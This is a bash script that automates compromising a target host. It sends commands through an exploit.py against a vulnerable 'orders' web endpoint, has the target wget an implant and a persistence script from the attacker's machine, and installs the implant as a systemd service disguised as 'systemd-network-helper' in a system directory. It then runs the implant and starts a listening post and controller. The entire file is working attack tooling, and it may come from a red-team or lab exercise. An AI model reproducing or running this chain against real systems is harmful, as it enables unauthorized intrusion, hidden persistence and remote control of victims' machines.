#!/bin/bash

set -e

PORT=8000
TARGET_PORT=8080
TARGET_ENDPOINT="orders"

usage() {
    echo "Usage: $0 -b IMPLANT_BINARY -p PERSISTENCE_SCRIPT -i TARGET_IP [-l LISTENING_POST] [-c CONTROLLER]"
    echo "  -b    Absolute path to your implant binary"
    echo "  -p    Absolute path to your persistence script"
    echo "  -i    IP address of the vulnerable target"
    echo "  -l    (Optional) Absolute path to listening_post.py"
    echo "  -c    (Optional) Absolute path to controller.py"
    exit 1
}

while getopts "b:p:i:l:c:h" opt; do
    case "$opt" in
        b) IMPLANT_FILE="$OPTARG" ;;
        p) PERSISTENCE_SCRIPT="$OPTARG" ;;
        i) TARGET_IP="$OPTARG" ;;
        l) LISTENING_POST="$OPTARG" ;;
        c) CONTROLLER="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Validate required arguments
if [ -z "$IMPLANT_FILE" ] || [ -z "$PERSISTENCE_SCRIPT" ] || [ -z "$TARGET_IP" ]; then
    echo "[!] Error: -b, -p, and -i are required."
    usage
fi

for f in "$IMPLANT_FILE" "$PERSISTENCE_SCRIPT"; do
    if [ ! -f "$f" ]; then
        echo "[!] Error: File not found: $f"
        exit 1
    fi
done

# Determine local IP
if [[ "$OSTYPE" == "darwin"* ]]; then
    LOCAL_IP=$(ipconfig getifaddr en0 2>/dev/null || echo "127.0.0.1")
else
    LOCAL_IP=$(hostname -I | awk '{print $1}')
fi

IMPLANT_NAME=$(basename "$IMPLANT_FILE")
PERSIST_NAME=$(basename "$PERSISTENCE_SCRIPT")
REMOTE_DIR="/var/lib/systemd/catalog"
REMOTE_IMPLANT="$REMOTE_DIR/$IMPLANT_NAME"
SERVICE_NAME="systemd-network-helper"

# Helper: send command via exploit.py
send_cmd() {
    python3 exploit.py "http://${TARGET_IP}:${TARGET_PORT}/${TARGET_ENDPOINT}/" "$1"
}

# ----------------------------------------------------------------------
# 1. Start local HTTP server
# ----------------------------------------------------------------------
echo "[*] Starting HTTP server at http://$LOCAL_IP:$PORT"
python3 -m http.server "$PORT" >/dev/null 2>&1 &
SERVER_PID=$!
sleep 2

# ----------------------------------------------------------------------
# 2. Upload implant & persistence script
# ----------------------------------------------------------------------
echo "[*] Uploading implant binary..."
send_cmd "mkdir -p $REMOTE_DIR"
send_cmd "wget -q http://$LOCAL_IP:$PORT/$IMPLANT_NAME -O $REMOTE_IMPLANT"
send_cmd "chmod +x $REMOTE_IMPLANT"

echo "[*] Uploading persistence script..."
send_cmd "wget -q http://$LOCAL_IP:$PORT/$PERSIST_NAME -O /tmp/$PERSIST_NAME"
send_cmd "chmod +x /tmp/$PERSIST_NAME"

echo "[*] Installing persistence (requires root)..."
send_cmd "/tmp/$PERSIST_NAME -n $SERVICE_NAME -b $REMOTE_IMPLANT -d 'Network Helper Daemon' -a network.target"
send_cmd "rm -f /tmp/$PERSIST_NAME"
echo "[+] Persistence installed."

# ----------------------------------------------------------------------
# 3. Stop HTTP server & launch implant
# ----------------------------------------------------------------------
echo "[*] Stopping HTTP server..."
kill $SERVER_PID 2>/dev/null || true

echo "[*] Launching implant now..."
send_cmd "cd $REMOTE_DIR && nohup ./$IMPLANT_NAME >/dev/null 2>&1 &"
echo "[+] Implant is running."

# ----------------------------------------------------------------------
# 4. Start listening post (with proper .env loading)
# ----------------------------------------------------------------------
if [ -n "$LISTENING_POST" ]; then
    LP_DIR=$(dirname "$LISTENING_POST")
    LP_FILE=$(basename "$LISTENING_POST")
    echo "[*] Starting listening post in $LP_DIR"
    (cd "$LP_DIR" && python3 "$LP_FILE") &
    LP_PID=$!
    sleep 3
fi

# ----------------------------------------------------------------------
# 5. Start controller (also in its own directory if needed)
# ----------------------------------------------------------------------
if [ -n "$CONTROLLER" ]; then
    CTRL_DIR=$(dirname "$CONTROLLER")
    CTRL_FILE=$(basename "$CONTROLLER")
    echo "[*] Starting controller in $CTRL_DIR"
    (cd "$CTRL_DIR" && python3 "$CTRL_FILE" "$LOCAL_IP" 5000)
fi

# Wait for listening post if it was started
if [ -n "$LP_PID" ]; then
    wait $LP_PID
fi